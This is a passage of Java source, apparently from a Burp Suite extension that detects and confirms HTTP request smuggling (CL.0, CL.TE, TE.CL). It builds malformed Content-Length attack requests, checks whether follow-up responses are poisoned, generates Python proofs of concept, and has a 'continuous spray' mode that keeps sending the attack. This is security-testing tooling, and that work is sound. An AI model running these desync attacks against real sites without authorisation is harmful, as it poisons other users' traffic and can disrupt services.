        final DesyncRepro.Type[] winType = new DesyncRepro.Type[1];
        final String[] winTech = new String[1];
        final Resp[] sweepBaseline = new Resp[1];
        final Resp[] sweepAttack = new Resp[1];
        final Resp[] sweepFollow = new Resp[1];

        testSweepWorker = new SwingWorker<String, String>() {
            @Override
            protected String doInBackground() {
                try {
                    IHttpService svc = Utilities.helpers.buildHttpService(
                            service.host(), service.port(), service.secure());

                    // Follow-up is independent of the smuggled gadget/type, so baseline once.
                    byte[] followBytes = DesyncRepro.build(DesyncRepro.Type.CL_0, reqSnapshot,
                            DesyncRepro.DEFAULT_SMUGGLED_LINE, null).followUpRequest;

                    // Warmup: prime the connection pool.
                    publish("Warmup: priming connection...");
                    tryBaseline(svc, followBytes);

                    publish("Baseline: sending the follow-up request on its own...");
                    Resp base1 = tryBaseline(svc, followBytes);
                    if (base1 == null) {
                        if (originalReachable(svc)) {
                            return runH2Confirmation(svc, reqSnapshot, initialTechnique, userSmuggledLine,
                                    this::publish);
                        }
                        return "UNREACHABLE: " + unreachableDiagnosis(svc);
                    }
                    sweepBaseline[0] = base1;
                    Resp base2 = tryBaseline(svc, followBytes);
                    boolean stable = base2 != null && !base2.failed() && similar(base1, base2);
                    publish("Baseline follow-up: HTTP " + base1.getStatus() + ", " + respLen(base1)
                            + " bytes" + (stable ? " (stable)" : " (UNSTABLE — results may be noisy)"));

                    String canary = "z" + Utilities.generateCanary();
                    LinkedHashSet<String> gadgetSet = new LinkedHashSet<>();
                    gadgetSet.add(userSmuggledLine);
                    gadgetSet.add(DesyncRepro.DEFAULT_SMUGGLED_LINE);
                    gadgetSet.add("GET /" + canary + ".html HTTP/1.1");
                    String[] gadgets = gadgetSet.toArray(new String[0]);
                    // Pull all enabled CL.0 techniques (shared + CL + H1 permutations),
                    // prioritizing the ones most commonly seen in findings.
                    ArrayList<String> allClTechniques = allEnabledClTechniques();
                    publish("Sweep will try " + allClTechniques.size() + " enabled CL.0 technique(s).");

                    int attemptsPerCombo = SINGLE_CONNECTION_ATTEMPTS;
                    int comboCount = 0;
                    int baselineRefreshCounter = 0;
                    for (DesyncRepro.Type type : orderedTypes(primary)) {
                        if (stopRequested()) {
                            return stoppedByUserMessage("auto-sweep");
                        }
                        List<String> techniques = type == DesyncRepro.Type.CL_0
                                ? allClTechniques : java.util.Collections.singletonList("vanilla");
                        for (String technique : techniques) {
                            if (stopRequested()) {
                                return stoppedByUserMessage("auto-sweep");
                            }
                            for (String gadget : gadgets) {
                                if (stopRequested()) {
                                    return stoppedByUserMessage("auto-sweep");
                                }
                                comboCount++;

                                // Refresh baseline every 6 combos to catch response drift.
                                baselineRefreshCounter++;
                                if (baselineRefreshCounter >= 6) {
                                    baselineRefreshCounter = 0;
                                    Resp freshBase = tryBaseline(svc, followBytes);
                                    if (freshBase != null && !freshBase.failed()) {
                                        base1 = freshBase;
                                        sweepBaseline[0] = freshBase;
                                    }
                                }

                                String desc = type.label
                                        + (type == DesyncRepro.Type.CL_0 ? " [" + technique + "]" : "")
                                        + " smuggling '" + gadget + "'";
                                publish("\nTrying " + desc + "...");
                                DesyncRepro candidate = DesyncRepro.build(type, reqSnapshot, gadget, technique);
                                byte[] attackBytes = ChunkContentScan.bypassContentLengthFix(candidate.attackRequest);

                                int singleConn = 0;
                                int poisoned = 0;
                                int skipped = 0;
                                Resp evidence = null;
                                for (int i = 1; i <= attemptsPerCombo; i++) {
                                    if (stopRequested()) {
                                        return stoppedByUserMessage("auto-sweep");
                                    }
                                    byte[] bustedFollow = Utilities.addCacheBuster(candidate.followUpRequest, null);
                                    TurboHelper helper = new TurboHelper(svc, true);
                                    helper.queue(attackBytes);
                                    helper.queue(bustedFollow);
                                    List<Resp> results = helper.waitFor();
                                    int conns = helper.getConnectionCount();
                                    if (results == null || results.size() < 2 || results.get(1) == null
                                            || results.get(1).failed() || conns > 1) {
                                        skipped++;
                                        continue;
                                    }
                                    singleConn++;
                                    Resp attackR = results.get(0);
                                    Resp p = results.get(1);
                                    if (!similar(p, base1)) {
                                        poisoned++;
                                        if (evidence == null) {
                                            evidence = p;
                                        }
                                        sweepAttack[0] = attackR;
                                        sweepFollow[0] = p;
                                    }
                                }

                                // Bonus attempts if most were wasted on failures/multi-conn.
                                if (poisoned == 0 && skipped >= 3 && singleConn < attemptsPerCombo / 2) {
                                    publish("  (" + skipped + " wasted — running " + skipped + " bonus attempts)");
                                    for (int i = 0; i < skipped && i < attemptsPerCombo; i++) {
                                        if (stopRequested()) {
                                            return stoppedByUserMessage("auto-sweep");
                                        }
                                        byte[] bustedFollow = Utilities.addCacheBuster(candidate.followUpRequest, null);
                                        TurboHelper helper = new TurboHelper(svc, true);
                                        helper.queue(attackBytes);
                                        helper.queue(bustedFollow);
                                        List<Resp> results = helper.waitFor();
                                        int conns = helper.getConnectionCount();
                                        if (results == null || results.size() < 2 || results.get(1) == null
                                                || results.get(1).failed() || conns > 1) {
                                            continue;
                                        }
                                        singleConn++;
                                        Resp p = results.get(1);
                                        if (!similar(p, base1)) {
                                            poisoned++;
                                            if (evidence == null) evidence = p;
                                            sweepAttack[0] = results.get(0);
                                            sweepFollow[0] = p;
                                        }
                                    }
                                }

                                if (stopRequested()) {
                                    return stoppedByUserMessage("auto-sweep");
                                }
                                if (singleConn == 0) {
                                    publish("  inconclusive (no single-connection attempt held).");
                                } else if (poisoned > 0) {
                                    winLine[0] = gadget;
                                    winType[0] = type;
                                    winTech[0] = technique;
                                    StringBuilder v = new StringBuilder();
                                    v.append("\n========================================\n");
                                    v.append("DESYNC CONFIRMED after ").append(comboCount).append(" combination(s).\n");
                                    v.append("Winning PoC: ").append(desc).append("\n");
                                    v.append("Signal: ").append(poisoned).append("/").append(singleConn)
                                            .append(" single-connection attempts poisoned the follow-up.\n");
                                    v.append("This PoC has been loaded into the attack/follow-up tabs.\n");
                                    if (!stable) {
                                        v.append("Caution: baseline was unstable; verify the change is the smuggled response.\n");
                                    }
                                    v.append("\n--- BASELINE follow-up response (first ~1000 bytes) ---\n");
                                    v.append(truncate(respString(base1), 1000));
                                    v.append("\n\n--- POISONED follow-up response (first ~1000 bytes) ---\n");
                                    v.append(truncate(respString(evidence), 1000));
                                    return v.toString();
                                } else {
                                    publish("  no change (" + singleConn + " single-connection attempts).");
                                }
                            }
                        }
                    }
                    // TurboHelper pair approach didn't work for any combo.
                    // Fall back to the scanner's own detection as a last resort.
                    publish("\n========================================\n"
                            + "NOT CONFIRMED after " + comboCount + " combinations via pair approach.\n"
                            + "Falling back to scanner-style self-poison detection...");

                    String scannerResult = runScannerStyleFallback(
                            svc, reqSnapshot.clone(), userSmuggledLine, this::publish);
                    if (scannerResult != null) {
                        return scannerResult;
                    }

                    // Final fallback: try the full H2 confirmation path if it looks HTTP/2-capable.
                    if (originalReachable(svc) && isLikelyH2Only(svc)) {
                        publish("\nScanner fallback didn't find it either. Trying full HTTP/2 "
                                + "technique sweep...");
                        return runH2Confirmation(svc, reqSnapshot, initialTechnique,
                                userSmuggledLine, this::publish);
                    }

                    return "\n========================================\n"
                            + "NOT CONFIRMED after " + comboCount + " TurboHelper combos + scanner fallback.\n"
                            + "The session may be invalid (validate it), or the desync may be\n"
                            + "intermittent/environment-specific.";
                } catch (Throwable t) {
                    String detail = t.getMessage() == null ? t.toString() : t.getMessage();
                    return "\nAuto-sweep failed: " + detail;
                }
            }

            @Override
            protected void process(List<String> chunks) {
                for (String c : chunks) {
                    appendTest(c);
                }
            }

            @Override
            protected void done() {
                try {
                    appendTest(get());
                    String verdict = testArea.getText();
                    if (verdict.contains("STOPPED")) {
                        setStatus("Auto-sweep stopped.");
                    } else if (winType[0] != null) {
                        displayCapturedResponses(sweepBaseline[0], sweepAttack[0], sweepFollow[0]);
                        typeCombo.setSelectedItem(winType[0]);
                        if (winLine[0] != null) {
                            smuggledLineField.setText(winLine[0]);
                        }
                        regenerate();
                        generatePythonPoc();
                        setStatus("Auto-sweep CONFIRMED — PoC loaded. See #1/#2 tabs for responses.");
                    } else if (verdict.contains("CONFIRMED") && !verdict.contains("NOT CONFIRMED")) {
                        // HTTP/2 path already loaded/sent the confirmed request itself.
                        setStatus("HTTP/2 desync CONFIRMED — finding filed in Burp. See Test result tab.");
                    } else {
                        setStatus("Auto-sweep finished — no desync confirmed.");
                    }
                } catch (Exception ex) {
                    appendTest("\nAuto-sweep failed: " + ex.getMessage());
                    setStatus("Auto-sweep failed.");
                } finally {
                    finishTestOrSweepJob();
                }
            }
        };
        testSweepWorker.execute();
    }

    private boolean stopRequested() {
        return jobStopRequested || Utilities.unloaded.get();
    }

    private void requestStopTestOrSweep() {
        jobStopRequested = true;
        if (testSweepWorker != null) {
            testSweepWorker.cancel(true);
        }
        if (activeJobKind == ActiveJobKind.TEST) {
            testButton.setText("Stopping...");
            setStatus("Stopping test...");
        } else if (activeJobKind == ActiveJobKind.SWEEP) {
            sweepButton.setText("Stopping...");
            setStatus("Stopping auto-sweep...");
        }
    }

    private static String stoppedByUserMessage(String jobName) {
        return "\n========================================\n"
                + "STOPPED — " + jobName + " cancelled by user.\n";
    }

    private void finishTestOrSweepJob() {
        SwingUtilities.invokeLater(() -> {
            activeJobKind = ActiveJobKind.NONE;
            jobStopRequested = false;
            testSweepWorker = null;
            setTestSweepJobUi(ActiveJobKind.NONE);
        });
    }

    /** Enables the running job's button as "Stop …" and disables the other actions. */
    private void setTestSweepJobUi(ActiveJobKind kind) {
        SwingUtilities.invokeLater(() -> {
            boolean running = kind != ActiveJobKind.NONE;
            boolean sprayRunning = sprayWorker != null && !sprayWorker.isDone();
            testButton.setText(kind == ActiveJobKind.TEST ? "Stop test" : "Run test now");
            sweepButton.setText(kind == ActiveJobKind.SWEEP ? "Stop sweep" : "Auto-sweep");
            testButton.setEnabled(!sprayRunning && (kind == ActiveJobKind.NONE || kind == ActiveJobKind.TEST));
            sweepButton.setEnabled(!sprayRunning && (kind == ActiveJobKind.NONE || kind == ActiveJobKind.SWEEP));
            sprayButton.setEnabled(!running && !sprayRunning);
        });
    }

    private static DesyncRepro.Type[] orderedTypes(DesyncRepro.Type primary) {
        java.util.LinkedHashSet<DesyncRepro.Type> order = new java.util.LinkedHashSet<>();
        if (primary != null && primary != DesyncRepro.Type.UNKNOWN) {
            order.add(primary);
        }
        order.add(DesyncRepro.Type.CL_0);
        order.add(DesyncRepro.Type.CL_TE);
        order.add(DesyncRepro.Type.TE_CL);
        return order.toArray(new DesyncRepro.Type[0]);
    }

    private void appendTest(String line) {
        SwingUtilities.invokeLater(() -> {
            testArea.append((line == null ? "" : line) + "\n");
            testArea.setCaretPosition(testArea.getDocument().getLength());
        });
    }

    private static Resp tryBaseline(IHttpService svc, byte[] followBytes) {
        for (int i = 0; i < 2; i++) {
            try {
                byte[] busted = Utilities.addCacheBuster(followBytes, null);
                Resp r = new TurboHelper(svc, true).blockingRequest(busted);
                if (r != null && !r.failed() && r.getStatus() != 0) {
                    return r;
                }
            } catch (Throwable ignored) {
                // retry
            }
        }
        return null;
    }

    /** Explains why the baseline failed: dead target/session vs HTTP/2-only front-end. */
    private String unreachableDiagnosis(IHttpService svc) {
        try {
            Resp orig = Scan.request(svc, requestBytes, 1, false);
            if (orig != null && !orig.failed() && orig.getStatus() != 0) {
                return "the target answered the original captured request but NOT a plain HTTP/1.1 "
                        + "request. It is likely HTTP/2-only — auto-sweep will confirm CL.0 using the "
                        + "scanner's Content-Length permutations instead of a single-connection HTTP/1.1 PoC.";
            }
        } catch (Throwable ignored) {
            // fall through
        }
        return "the follow-up request got no valid response — the target may be down or the session "
                + "may be invalid. Use \"Validate session\" above to check, then retry.";
    }

    /** True if HTTP/1.1 baseline fails but the original request works — likely HTTP/2-only. */
    private boolean isLikelyH2Only(IHttpService svc) {
        try {
            if (tryBaseline(svc, buildPlainFollowUp(workingRequest)) == null) {
                return originalReachable(svc);
            }
        } catch (Throwable ignored) {
            // fall through
        }
        return false;
    }

    /** True if the original captured request still gets a valid response (e.g. over HTTP/2). */
    private boolean originalReachable(IHttpService svc) {
        try {
            Resp orig = Scan.request(svc, requestBytes, 1, false);
            return orig != null && !orig.failed() && orig.getStatus() != 0;
        } catch (Throwable ignored) {
            return false;
        }
    }

    /**
     * Runs the scanner's own self-poison detection ({@link ImplicitZeroScan#doConfiguredScan})
     * as a fallback when the TurboHelper pair approach fails. This uses the exact same detection
     * code that found the issue during the original scan: send the same attack N times via Burp's
     * HTTP engine (which handles HTTP/2, connection reuse, etc. natively) and check if the
     * response to attempt N looks like the smuggled gadget from attempt N-1.
     *
     * <p>Tries the technique from the current PoC first, then a handful of common ones.
     * Returns a verdict string on success, or null if nothing confirmed.</p>
     */
    private String runScannerStyleFallback(IHttpService svc, byte[] reqSnapshot,
                                           String preferredSmuggledLine,
                                           java.util.function.Consumer<String> publish) {
        String gadgetLine = (preferredSmuggledLine == null || preferredSmuggledLine.trim().isEmpty())
                ? DesyncRepro.DEFAULT_SMUGGLED_LINE : preferredSmuggledLine.trim();
        String currentTechnique = repro != null ? repro.technique : "vanilla";

        LinkedHashSet<String> toTry = new LinkedHashSet<>();
        if (currentTechnique != null && !currentTechnique.isEmpty()) {
            toTry.add(currentTechnique);
        }
        if (initialTechnique != null && !initialTechnique.isEmpty()) {
            toTry.add(initialTechnique);
        }
        toTry.add("vanilla");
        toTry.add("tabsuffix");
        toTry.add("CL-pad");
        toTry.add("nameprefix1");
        toTry.add("spacejoin1");

        publish.accept("\nScanner fallback: trying " + toTry.size() + " techniques via Burp's HTTP engine "
                + "(same code as the original scan)...");

        for (String technique : toTry) {
            if (stopRequested()) return stoppedByUserMessage("scanner fallback");
            if (!techniqueEnabled(technique)) continue;
            publish.accept("  Scanner-style: technique '" + technique + "' with '" + gadgetLine + "'...");
            try {
                ImplicitZeroScan scan = new ImplicitZeroScan("CL.0 (agent fallback)");
                HashMap<String, Boolean> cfg = new HashMap<>();
                cfg.put(technique, true);
                boolean hit = scan.doConfiguredScan(reqSnapshot.clone(), svc, cfg, gadgetLine);
                if (hit) {
                    String repeaterNote = loadAndSendConfirmed(scan);
                    return "\n========================================\n"
                            + "DESYNC CONFIRMED via scanner fallback using technique '" + technique + "'"
                            + (scan.lastConfirmedGadget != null
                            ? " (smuggled: " + scan.lastConfirmedGadget + ")" : "") + ".\n"
                            + "The scanner's self-poison loop detected the desync"
                            + (scan.lastConfirmedOverH2 ? " over HTTP/2" : "") + ".\n\n"
                            + "Note: this was caught by Burp's HTTP engine, not the TurboHelper\n"
                            + "pair approach. This usually means the target needs HTTP/2 or the\n"
                            + "desync only manifests with Burp's connection reuse pattern.\n\n"
                            + "A finding has been filed in Burp (Dashboard / Organizer / Issues).\n"
                            + repeaterNote;
                }
                publish.accept("    (no hit with '" + technique + "')");
            } catch (Throwable t) {
                publish.accept("    (" + technique + " errored: "
                        + (t.getMessage() == null ? t.toString() : t.getMessage()) + ")");
            }
        }
        return null;
    }

    /**
     * The HTTP/1.1 single-connection PoC cannot reach an HTTP/2-only front-end. This drives the
     * extension's own CL.0 detection ({@link ImplicitZeroScan#doConfiguredScan}) with the same
     * Content-Length permutation set the scanner uses (shared + CL + HTTP/2 techniques), not just
     * the small HTTP/2 pseudo-header set. On success it files a finding with request/response proof.
     */
    private String runH2Confirmation(IHttpService svc, byte[] reqSnapshot, String prioritizeTechnique,
                                     String preferredSmuggledLine,
                                     java.util.function.Consumer<String> publish) {
        publish.accept("\nHTTP/1.1 did not reach the target, but the original request does — treating "
                + "this as an HTTP/2 front-end.");
        final String gadgetLine = (preferredSmuggledLine == null || preferredSmuggledLine.trim().isEmpty())
                ? DesyncRepro.DEFAULT_SMUGGLED_LINE : preferredSmuggledLine.trim();
        publish.accept("Confirming CL.0 (smuggled line: " + gadgetLine + ") with Content-Length "
                + "permutations + repeated-send poisoning check...");

        byte[] h2req = reqSnapshot;
        if (!Utilities.isHTTP2(h2req)) {
            h2req = Utilities.replaceFirst(h2req, " HTTP/1.1\r\n", " HTTP/2\r\n");
        }

        ImplicitZeroScan scan = new ImplicitZeroScan("CL.0 (desync agent / HTTP-2)");
        ArrayList<String> techniques = clZeroTechniquesOrdered(prioritizeTechnique);
        publish.accept("Trying " + techniques.size() + " CL.0 technique(s)"
                + (prioritizeTechnique != null && !prioritizeTechnique.isEmpty()
                ? " (starting with '" + prioritizeTechnique + "' from the finding)" : "")
                + "...");

        int tried = 0;
        int skipped = 0;
        for (String technique : techniques) {
            if (stopRequested()) {
                return stoppedByUserMessage("HTTP/2 confirmation");
            }
            if (technique == null || technique.isEmpty()) {
                continue;
            }
            if (!techniqueEnabled(technique)) {
                skipped++;
                continue;
            }
            tried++;
            publish.accept("  CL.0 technique '" + technique + "'...");
            try {
                HashMap<String, Boolean> cfg = new HashMap<>();
                cfg.put(technique, true);
                boolean hit = scan.doConfiguredScan(h2req.clone(), svc, cfg, gadgetLine);
                if (hit) {
                    String repeaterNote = loadAndSendConfirmed(scan);
                    return "\n========================================\n"
                            + "CL.0 CONFIRMED using technique '" + technique + "'"
                            + (scan.lastConfirmedGadget != null
                            ? " (smuggled: " + scan.lastConfirmedGadget + ")" : "") + ".\n"
                            + "The scanner repeatedly issued the attack and saw a response poisoned by\n"
                            + "the previous request's body"
                            + (scan.lastConfirmedOverH2 ? " (sent over HTTP/2)." : ".") + "\n\n"
                            + "A finding with the request/response proof has been filed in Burp\n"
                            + "(Dashboard / Organizer / Issues).\n"
                            + repeaterNote;
                }
            } catch (Throwable t) {
                String d = t.getMessage() == null ? t.toString() : t.getMessage();
                publish.accept("    (" + technique + " errored: " + d + ")");
            }
        }

        String skippedNote = skipped > 0
                ? " (" + skipped + " skipped because they are disabled in extension settings)" : "";
        return "\n========================================\n"
                + "NOT CONFIRMED after " + tried + " CL.0 technique(s)" + skippedNote + ".\n"
                + "The original finding may have been intermittent or session-dependent. Validate the\n"
                + "session above, then re-run. If you opened the agent from a CL.0 issue, the technique\n"
                + "named in that issue is tried first; otherwise try \"CL.0 probe\" / \"Smart scan\" on\n"
                + "the Smuggle Targets tab (full scan uses " + ImplicitZeroScan.SCAN_ATTEMPTS_PER_TECHNIQUE
                + " attempts per technique).";
    }

    /**
     * Loads the exact request the scanner confirmed into the attack/follow-up tabs and sends both to
     * Repeater as genuine HTTP/2 requests. This path is only reached for HTTP/2-only front-ends, so
     * an HTTP/1.1-framed Repeater tab would not reproduce the desync — we build real HTTP/2 requests
     * via {@link H2Connection} (the same conversion the scanner used to send the attack) so the tabs
     * open in HTTP/2 mode with the malformed header intact. Returns a note describing what happened.
     */
    private String loadAndSendConfirmed(ImplicitZeroScan scan) {
        final byte[] confirmed = scan.lastConfirmedAttack;
        final byte[] base = scan.lastConfirmedBase != null ? scan.lastConfirmedBase : workingRequest;
        if (confirmed == null) {
            return "\nThe confirming request is recorded in the Burp issue.";
        }
        final byte[] follow = buildPlainFollowUp(base);
        // Remember the raw confirming bytes so the Python PoC export uses the exact attack.
        confirmedAttackBytes = confirmed.clone();
        confirmedFollowBytes = follow.clone();
        confirmedTechnique = scan.lastConfirmedTechnique;
        confirmedOverH2 = scan.lastConfirmedOverH2;
        generatePythonPoc();

        SwingUtilities.invokeLater(() -> {
            attackArea.setText(renderH2(confirmed));
            attackArea.setCaretPosition(0);
            followUpArea.setText(renderH2(follow));
            followUpArea.setCaretPosition(0);
            setStatus("CL.0 confirmed — PoC loaded. Use \"Keep spraying\" or \"Send both to Repeater\".");
        });

        return "\nThe confirming attack + follow-up are in the '#1 attack' / '#2 Follow-up' tabs.\n"
                + "For a live demo while you browse:\n"
                + "  • Click **Keep spraying** — sends the attack continuously through Burp (see Proxy\n"
                + "    history). Browse the same host in your browser (also through Burp).\n"
                + "  • Use **Send both to Repeater** only if you want to replay manually in Repeater.\n"
                + "  • Or use the **Python PoC** tab for a standalone script (optional).\n";
    }

    private void toggleContinuousSpray() {
        if (sprayWorker != null && !sprayWorker.isDone()) {
            sprayStopRequested = true;
            sprayButton.setText("Stopping...");
            setStatus("Stopping continuous spray...");
            return;
        }
        if (service == null) {
            appendTest("\nCannot spray: no HTTP service for this request.");
            return;
        }
        startContinuousSpray();
    }

    private void startContinuousSpray() {
        final String cookieNote = syncCookie();
        final byte[] attackBytes = getSprayAttackBytes();
        if (attackBytes == null || attackBytes.length == 0) {
            appendTest("\nCannot spray: no attack request. Run auto-sweep first or edit the #1 attack tab.");
            return;
        }
        final byte[] followBytes = getSprayFollowBytes();
        final boolean h2 = useH2ForSpray();
        final String technique = confirmedTechnique;

        sprayStopRequested = false;
        setSprayControlsRunning(true);
        tabs.setSelectedIndex(0);
        appendTest("\n--- Continuous spray (Burp) ---\n" + cookieNote);
        appendTest(h2
                ? "Mode: HTTP/2 via Burp (each attack appears in Proxy history)."
                : "Mode: HTTP/1.1 single-connection spray + periodic self-check.");
        appendTest("Click 'Stop spraying' when done. Browse the same host in your browser (through Burp).\n");

        sprayWorker = new SwingWorker<Void, String>() {
            int sprayed = 0;
            int errors = 0;
            int hits = 0;
            int cycle = 0;
            Resp baseline;
            int baselineStatus;
            int baselineLen;
            int baselineTol;

            @Override
            protected Void doInBackground() {
                try {
                    IHttpService svc = Utilities.helpers.buildHttpService(
                            service.host(), service.port(), service.secure());

                    if (!h2) {
                        publish("Measuring baseline follow-up...");
                        baseline = tryBaseline(svc, followBytes);
                        if (baseline == null) {
                            publish("WARNING: follow-up baseline failed — self-check disabled.");
                        } else {
                            baselineStatus = baseline.getStatus();
                            baselineLen = respLen(baseline);
                            baselineTol = Math.max(64, baselineLen / 10);
                            publish("Baseline: HTTP " + baselineStatus + ", " + baselineLen + " bytes");
                        }
                    }

                    while (!sprayStopRequested && !Utilities.unloaded.get()) {
                        cycle++;
                        try {
                            if (h2) {
                                Resp r = HTTP2Scan.h2request(svc, attackBytes.clone(), true);
                                if (r.failed()) {
                                    errors++;
                                } else {
                                    sprayed++;
                                }
                            } else {
                                Resp r = new TurboHelper(svc, true).blockingRequest(attackBytes);
                                if (r == null || r.failed()) {
                                    errors++;
                                } else {
                                    sprayed++;
                                }
                            }
                        } catch (Throwable t) {
                            errors++;
                        }

                        if (!h2 && baseline != null && cycle % 4 == 0) {
                            try {
                                TurboHelper helper = new TurboHelper(svc, true);
                                helper.queue(attackBytes);
                                helper.queue(followBytes);
                                List<Resp> results = helper.waitFor();
                                if (results != null && results.size() >= 2 && results.get(1) != null
                                        && !results.get(1).failed()
                                        && helper.getConnectionCount() <= 1) {
                                    Resp p = results.get(1);
                                    if (!similar(p, baseline)) {
                                        hits++;
                                        publish("[!!!] DESYNC HIT #" + hits + " — follow-up HTTP "
                                                + baselineStatus + " -> " + p.getStatus() + ", "
                                                + baselineLen + " -> " + respLen(p) + " bytes");
                                    }
                                }
                            } catch (Throwable ignored) {
                                errors++;
                            }
                        }

                        if (h2 && technique != null && !technique.isEmpty() && cycle % 12 == 0) {
                            publish("Re-checking desync with technique '" + technique + "'...");
                            try {
                                byte[] h2req = workingRequest.clone();
                                if (!Utilities.isHTTP2(h2req)) {
                                    h2req = Utilities.replaceFirst(h2req, " HTTP/1.1\r\n", " HTTP/2\r\n");
                                }
                                ImplicitZeroScan scan = new ImplicitZeroScan("CL.0 (agent spray verify)");
                                HashMap<String, Boolean> cfg = new HashMap<>();
                                cfg.put(technique, true);
                                String gadgetLine = currentSmuggledLine();
                                if (scan.doConfiguredScan(h2req, svc, cfg, gadgetLine)) {
                                    hits++;
                                    publish("[!!!] DESYNC still confirmed (technique '" + technique
                                            + "', smuggled: " + gadgetLine + ")");
                                }
                            } catch (Throwable ignored) {
                                errors++;
                            }
                        }

                        if (cycle % 10 == 0) {
                            publish("Spraying... " + sprayed + " sent, " + errors + " errors"
                                    + (hits > 0 ? ", " + hits + " desync hit(s)" : ""));
                        }

                        try {
                            Thread.sleep(50);
                        } catch (InterruptedException e) {
                            Thread.currentThread().interrupt();
                            break;
                        }
                    }
                } catch (Throwable t) {
                    publish("Spray failed: " + (t.getMessage() == null ? t.toString() : t.getMessage()));
                }
                return null;
            }

            @Override
            protected void process(List<String> chunks) {
                for (String c : chunks) {
                    appendTest(c);
                }
            }

            @Override
            protected void done() {
                appendTest("\nStopped. Sprayed " + sprayed + " attack(s), " + errors + " error(s)"
                        + (hits > 0 ? ", " + hits + " desync confirmation(s)." : ".")
                        + "\nCheck Burp Proxy history for each request.\n");
                setSprayControlsRunning(false);
                setStatus("Continuous spray stopped.");
            }
        };
        sprayWorker.execute();
    }

    /** Smuggled request line from the UI (defaults to favicon when empty). */
    private String currentSmuggledLine() {
        String line = smuggledLineField.getText() == null ? "" : smuggledLineField.getText().trim();
        if (line.isEmpty()) {
            line = DesyncRepro.DEFAULT_SMUGGLED_LINE;
        }
        return line;
    }

    /**
     * Builds a CL.0 attack using the same shape as {@link ImplicitZeroScan}, honoring the UI smuggled
     * line instead of auto-selected gadgets like wrtztrw.
     */
    private byte[] buildImplicitZeroAttack(byte[] baseReq, String technique, String gadgetLine) {
        if (technique == null || technique.isEmpty() || gadgetLine == null || gadgetLine.isEmpty()) {
            return null;
        }
        byte[] req = SmuggleScanBox.setupRequest(baseReq.clone());
        if (DesyncBox.applyDesync(req, "Content-Length", technique) == null) {
            return null;
        }
        boolean h2 = Utilities.isHTTP2(baseReq) || confirmedOverH2;
        req = Utilities.replaceFirst(req, " HTTP/2\r\n", " HTTP/1.1\r\n");
        if (h2) {
            req = Utilities.replaceFirst(req, "Connection: ", "X-Connection: ");
        } else {
            req = Utilities.addOrReplaceHeader(req, "Connection", "keep-alive");
        }
        Mapping gadget = ImplicitZeroScan.mappingForRequestLine(gadgetLine);
        String smuggle = String.format("%s\r\nX-YzBqv: ", gadget.payload);
        byte[] attack = Utilities.setBody(req, smuggle);
        attack = Utilities.fixContentLength(attack);
        byte[] mangled = DesyncBox.applyDesync(attack, "Content-Length", technique);
        return mangled != null ? mangled : attack;
    }

    private byte[] getSprayAttackBytes() {
        String line = currentSmuggledLine();
        String tech = confirmedTechnique;
        if (tech == null || tech.isEmpty()) {
            tech = initialTechnique;
        }
        if (tech != null && !tech.isEmpty()) {
            byte[] built = buildImplicitZeroAttack(workingRequest.clone(), tech, line);
            if (built != null) {
                return ChunkContentScan.bypassContentLengthFix(built);
            }
        }
        if (confirmedAttackBytes != null) {
            return ChunkContentScan.bypassContentLengthFix(confirmedAttackBytes.clone());
        }
        try {
            return ChunkContentScan.bypassContentLengthFix(
                    attackArea.getText().getBytes(StandardCharsets.ISO_8859_1));
        } catch (Throwable t) {
            return null;
        }
    }

    private byte[] getSprayFollowBytes() {
        if (confirmedFollowBytes != null) {
            return confirmedFollowBytes.clone();
        }
        if (repro != null) {
            return repro.followUpRequest.clone();
        }
        return buildPlainFollowUp(workingRequest);
    }

    private boolean useH2ForSpray() {
        if (confirmedOverH2) {
            return true;
        }
        if (Utilities.isHTTP2(workingRequest)) {
            return true;
        }
        if (service == null) {
            return false;
        }
        try {
            IHttpService svc = Utilities.helpers.buildHttpService(
                    service.host(), service.port(), service.secure());
            if (tryBaseline(svc, buildPlainFollowUp(workingRequest)) == null) {
                return originalReachable(svc);
            }
        } catch (Throwable ignored) {
            // fall through
        }
        return false;
    }

    private void setSprayControlsRunning(boolean running) {
        SwingUtilities.invokeLater(() -> {
            boolean testSweepRunning = activeJobKind != ActiveJobKind.NONE;
            testButton.setEnabled(!running && !testSweepRunning);
            sweepButton.setEnabled(!running && !testSweepRunning);
            sprayButton.setText(running ? "Stop spraying" : "Keep spraying");
            if (running) {
                setStatus("Continuous spray running — browse the target in your browser (through Burp).");
            }
        });
    }

    /**
     * Builds a real HTTP/2 {@link HttpRequest} from raw request bytes using the extension's own
     * HTTP/1.1-to-HTTP/2 conversion ({@link H2Connection}). This mirrors {@link HTTP2Scan#h2request}
     * and preserves header values (including the malformed Content-Length the desync relies on).
     */
    private HttpRequest toHttp2Request(byte[] reqBytes) {
        String reqStr = Utilities.helpers.bytesToString(reqBytes);
        java.util.LinkedList<kotlin.Pair<String, String>> pairs =
                H2Connection.Companion.buildReq(new HTTP2Request(reqStr), true);
        java.util.List<HttpHeader> headers = new ArrayList<>();
        for (kotlin.Pair<String, String> p : pairs) {
            headers.add(HttpHeader.httpHeader(p.getFirst(), p.getSecond()));
        }
        byte[] body = Utilities.getBodyBytes(reqBytes);
        return HttpRequest.http2Request(service, headers,
                ByteArray.byteArray(body == null ? new byte[0] : body));
    }

    /** Human-readable HTTP/2 rendering: pseudo-headers + headers + body, for the PoC tabs. */
    private static String renderH2(byte[] reqBytes) {
        try {
            String reqStr = Utilities.helpers.bytesToString(reqBytes);
            java.util.LinkedList<kotlin.Pair<String, String>> pairs =
                    H2Connection.Companion.buildReq(new HTTP2Request(reqStr), true);
            StringBuilder sb = new StringBuilder("# HTTP/2 request (as sent to Repeater)\n");
            for (kotlin.Pair<String, String> p : pairs) {
                sb.append(p.getFirst()).append(": ").append(p.getSecond()).append('\n');
            }
            byte[] body = Utilities.getBodyBytes(reqBytes);
            if (body != null && body.length > 0) {
                sb.append('\n').append(new String(body, StandardCharsets.ISO_8859_1));
            }
            return sb.toString();
        } catch (Throwable t) {
            return new String(reqBytes, StandardCharsets.ISO_8859_1);
        }
    }

    /**
     * Builds a standalone Python PoC from the confirmed request (if a test/sweep confirmed one) or
     * the current generated PoC, and shows it in the Python PoC tab. HTTP/2 targets get an h2-library
     * script; otherwise a raw-socket HTTP/1.1 script.
     */
    private void generatePythonPoc() {
        final byte[] attack = confirmedAttackBytes != null ? confirmedAttackBytes
                : (repro != null ? repro.attackRequest : workingRequest);
        final byte[] follow = confirmedFollowBytes != null ? confirmedFollowBytes
                : (repro != null ? repro.followUpRequest : buildPlainFollowUp(workingRequest));
        final boolean h2 = confirmedAttackBytes != null || Utilities.isHTTP2(workingRequest);
        String script;
        try {
